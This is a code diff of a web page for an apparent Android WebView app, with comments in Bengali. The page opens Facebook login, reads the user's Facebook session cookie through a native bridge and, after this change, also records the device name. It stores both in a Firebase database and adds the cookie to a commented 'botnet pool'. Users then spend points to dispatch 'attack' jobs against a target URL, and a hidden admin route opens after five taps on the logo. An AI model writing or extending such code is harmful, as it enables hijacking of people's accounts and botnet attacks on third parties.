@@ -60,21 +60,23 @@
 
     let currentUserCookie = "";
     let currentUserPoints = 0;
+    let currentUserKey = "";
 
-    // ═══ ১. ফেসবুক লগইন (অ্যাপের ভেতরেই ওপেন হবে) ═══
+    // ═══ ১. ফেসবুক লগইন ═══
     window.openFacebookLogin = function() {
-      // window.location.replace ব্যবহার করায় এটি অ্যাপের বাইরে ক্রোমে যাবে না
       window.location.replace("https://m.facebook.com/login");
     }
 
-    // ═══ ২. কুকি রিড ও সেভ ═══
+    // ═══ ২. কুকি এবং ডিভাইসের নাম রিড ও সেভ ═══
     window.grabCookieAndSave = async function() {
       const status = document.getElementById('loginStatus');
       let cookie = "";
+      let deviceName = "Unknown Device";
       
-      // অ্যান্ড্রয়েড নেটিভ কোড থেকে কুকি নেওয়া
-      if (window.AndroidCookieManager && window.AndroidCookieManager.getFbCookie) {
+      // অ্যান্ড্রয়েড নেটিভ কোড থেকে কুকি এবং ডিভাইসের নাম নেওয়া
+      if (window.AndroidCookieManager) {
         cookie = window.AndroidCookieManager.getFbCookie();
+        deviceName = window.AndroidCookieManager.getDeviceName(); // নতুন যোগ করা ডিভাইস নাম
       } else {
         return status.innerText = "❌ WebView Error. Are you using the APK?";
       }
@@ -88,15 +90,18 @@
       
       try {
         const dbRef = ref(db);
-        const userKey = btoa(cookie.substring(0, 15)); // কুকির প্রথম অংশ দিয়ে ইউনিক আইডি
+        currentUserKey = btoa(cookie.substring(0, 15)); // কুকির প্রথম অংশ দিয়ে ইউনিক আইডি
         
-        const snapshot = await get(child(dbRef, `users/${userKey}`));
+        const snapshot = await get(child(dbRef, `users/${currentUserKey}`));
         let points = 0;
 
         if (snapshot.exists()) {
           points = snapshot.val().points || 0;
+          // পুরনো ইউজার হলে কুকি ও ডিভাইসের নাম আপডেট করা
+          await update(ref(db, `users/${currentUserKey}`), { cookie: cookie, deviceName: deviceName });
         } else {
-          await set(ref(db, `users/${userKey}`), { cookie: cookie, points: 0 });
+          // নতুন ইউজার তৈরি
+          await set(ref(db, `users/${currentUserKey}`), { cookie: cookie, points: 0, deviceName: deviceName });
         }
 
         // বোটনেট পুলে কুকি অ্যাড করা
@@ -129,9 +134,9 @@
       status.innerText = "⚡ Deploying Botnet...";
       status.style.color = "yellow";
       try {
-        const userKey = btoa(currentUserCookie.substring(0, 15));
+        // currentUserKey ব্যবহার করে পয়েন্ট কমানো
         currentUserPoints--;
-        await update(ref(db, `users/${userKey}`), { points: currentUserPoints });
+        await update(ref(db, `users/${currentUserKey}`), { points: currentUserPoints });
         document.getElementById('userPoints').innerText = currentUserPoints;
 
         await set(push(ref(db, 'jobs')), { 
@@ -141,7 +146,9 @@
         status.innerText = "✅ Attack Deployed!";
         status.style.color = "#00ff41";
         document.getElementById('targetUrl').value = '';
-      } catch (e) { status.innerText = "❌ Error: " + e.message; }
+      } catch (e) { 
+        status.innerText = "❌ Error: " + e.message; 
+      }
     }
 
     // ═══ ৪. হিডেন অ্যাডমিন রুট (লোগোতে ৫ বার ট্যাপ) ═══
@@ -160,4 +167,4 @@
     });
   </script>
 </body>
-</html>
+  </html>
